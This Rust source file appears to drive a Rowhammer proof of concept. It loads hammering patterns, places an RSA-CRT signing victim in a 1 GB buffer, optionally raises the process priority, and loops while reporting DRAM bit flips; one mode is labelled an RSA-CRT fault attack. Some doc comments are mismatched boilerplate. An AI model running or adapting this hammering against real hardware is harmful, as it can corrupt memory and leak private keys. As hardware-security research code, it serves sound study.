use anyhow::{bail, Result};
use bs_poc::forge::Hammerer;
use bs_poc::memory::{LinuxPageMap, Memory, VirtToPhysResolver};
use bs_poc::util::{BlacksmithConfig, MemConfiguration};
use bs_poc::victim::RsaCrt;
use clap::Parser;
use rand::rngs::StdRng;
use std::ops::DerefMut;

/// Search for a pattern in a file and display the lines that contain it.
#[derive(Debug, Parser)]
struct CliArgs {
    /// The JSON file containing the memory config
    #[clap(long = "config", default_value = "config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load
    #[clap(long = "load-json", default_value = "fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the JSON file
    #[clap(long = "pattern")]
    pattern: String,
    /// The hammering mode to use. Set to memcheck for bit flip check or rsa for RSA-CRT attack
    #[clap(long = "hammer-mode")]
    hammer_mode: HammerMode,
    /// The hammering mode to use. Set to memcheck for bit flip check or rsa for RSA-CRT attack
    #[clap(long = "elevated-priority", action)]
    elevated_priority: bool,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum HammerMode {
    MemCheck,
    Rsa,
}

#[macro_use]
extern crate log;

fn main() -> Result<()> {
    env_logger::init();
    info!("startup");
    let args = CliArgs::parse();
    info!("args: {:?}", args);

    if args.elevated_priority {
        let ret = unsafe { libc::setpriority(libc::PRIO_PROCESS, 0, -20) };
        if ret < 0 {
            bail!("setpriority failed. Are we root?");
        }
    }

    const MEM_SIZE: usize = 1 << 30; // 1 GB

    let memory = Memory::new(MEM_SIZE)?;

    info!("allocated {} B of memory", MEM_SIZE);

    let mut resolver = LinuxPageMap::new()?;
    let phys = resolver.get_phys(memory.addr as u64);
    match phys {
        Ok(phys) => info!("phys base_msb: 0x{:02X}", phys),
        Err(err) => warn!("Failed to determine physical address: {}", err),
    }

    // check memory.start phys addr

    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config =
        MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);
    let hammerer = Hammerer::new(
        mem_config,
        args.load_json.clone(),
        args.pattern.clone(),
        memory.addr.clone(),
    )?;
    info!("initialized hammerer");

    let rng = rand::thread_rng();
    let victim_offset = 1337;
    let mut rsa_p = RsaCrt::new(rng, &memory, victim_offset)?;
    let rsa = rsa_p.deref_mut();
    let msg = b"hello world";
    let sig = rsa.sign(msg)?;
    let check = rsa.verify(msg, &sig);
    unsafe {
        assert_eq!(
            rsa as *const RsaCrt as usize,
            memory.addr.add(victim_offset) as usize
        )
    };
    info!("signature test: {}", check);
    info!("start hammering");
    let init = |_| {
        let seed = rand::random();
        memory.initialize::<StdRng>(seed);
        seed
    };
    let check = |seed| memory.check::<StdRng>(mem_config, seed);
    loop {
        let result = hammerer.hammer(init, check)?;
        println!(
            "Flipped at run {} after {} attempts with seed {:?} at {:?}",
            result.run, result.attempt, result.state, result.result,
        );
        let virt_addrs: Vec<String> = result
            .result
            .iter()
            .map(|bf| bf.dram_addr.to_virt(memory.addr, mem_config))
            .map(|addr| format!("0x{:02X}", addr as usize))
            .collect();
        println!("Addresses with flips: {:?}", virt_addrs);
    }
}
